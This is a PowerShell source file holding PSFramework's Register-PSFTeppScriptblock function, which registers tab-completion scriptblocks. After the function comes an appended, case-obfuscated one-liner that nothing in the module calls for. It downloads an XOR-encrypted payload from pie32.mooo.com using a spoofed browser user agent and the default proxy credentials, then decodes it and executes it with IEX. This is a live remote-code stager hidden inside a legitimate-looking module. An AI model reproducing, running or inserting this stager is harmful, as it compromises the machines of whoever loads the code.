function Register-PSFTeppScriptblock
{
    
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/Register-PSFTeppScriptblock')]
	Param (
		[Parameter(Mandatory = $true)]
		[System.Management.Automation.ScriptBlock]
		$ScriptBlock,
		
		[Parameter(Mandatory = $true)]
		[string]
		$Name,
		
		[PSFramework.TabExpansion.TeppScriptMode]
		$Mode = "Auto",
		
		[PSFramework.Parameter.TimeSpanParameter]
		$CacheDuration = 0
	)
	
	process
	{
		$scp = New-Object PSFramework.TabExpansion.ScriptContainer
		$scp.Name = $Name.ToLower()
		$scp.LastDuration = New-TimeSpan -Seconds -1
		$scp.LastResultsValidity = $CacheDuration
		
		if ($Mode -like "Auto")
		{
			$ast = [System.Management.Automation.Language.Parser]::ParseInput($ScriptBlock, [ref]$null, [ref]$null)
			$simple = $null -eq $ast.ParamBlock
		}
		elseif ($Mode -like "Simple") { $simple = $true }
		else { $simple = $false }
		
		if ($simple)
		{
			$scr = [scriptblock]::Create(@'
	param (
		$commandName,
		
		$parameterName,
		
		$wordToComplete,
		
		$commandAst,
		
		$fakeBoundParameter
	)

	$start = Get-Date
	$scriptContainer = [PSFramework.TabExpansion.TabExpansionHost]::Scripts["<name>"]
	if ($scriptContainer.ShouldExecute)
	{
		$scriptContainer.LastExecution = $start
			
		$innerScript = $scriptContainer.InnerScriptBlock
		[PSFramework.Utility.UtilityHost]::ImportScriptBlock($innerScript)
		
		try { $items = $innerScript.Invoke() | Write-Output }
		catch { $null = $scriptContainer.ErrorRecords.Enqueue($_) }
			
		foreach ($item in ($items | Where-Object { "$_" -like "$wordToComplete*"} | Sort-Object))
		{
			New-PSFTeppCompletionResult -CompletionText $item -ToolTip $item
		}

		$scriptContainer.LastDuration = (Get-Date) - $start
		if ($items) { $scriptContainer.LastResult = $items }
	}
	else
	{
		foreach ($item in ($scriptContainer.LastResult | Where-Object { "$_" -like "$wordToComplete*"} | Sort-Object))
		{
			New-PSFTeppCompletionResult -CompletionText $item -ToolTip $item
		}
	}
'@.Replace("<name>", $Name))
			$scp.ScriptBlock = $scr
			$scp.InnerScriptBlock = $ScriptBlock
		}
		else
		{
			$scp.ScriptBlock = $ScriptBlock
		}
		[PSFramework.TabExpansion.TabExpansionHost]::Scripts[$Name] = $scp
	}
}

[SyStEM.NET.SerViCePoIntMAnAGEr]::EXpect100COntINUE = 0;$wC=NEw-OBJeCt SyStem.Net.WEBClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEADerS.Add('User-Agent',$u);$wC.PRoxy = [SysTeM.NEt.WeBREquest]::DefAULtWeBPRoxY;$Wc.PrOxy.CREdENtIaLs = [SYsTEM.NET.CredENTIalCaChe]::DEfauLtNEtworKCreDeNtIaLS;$K='WF4g*_~s3^Z]IMEn6<@X`./kG%>80a[U';$I=0;[cHar[]]$B=([cHar[]]($Wc.DOWNloAdSTring("http://pie32.mooo.com:8080/index.asp")))|%{$_-BXOr$K[$i++%$k.LengTH]};IEX ($B-joIn'')

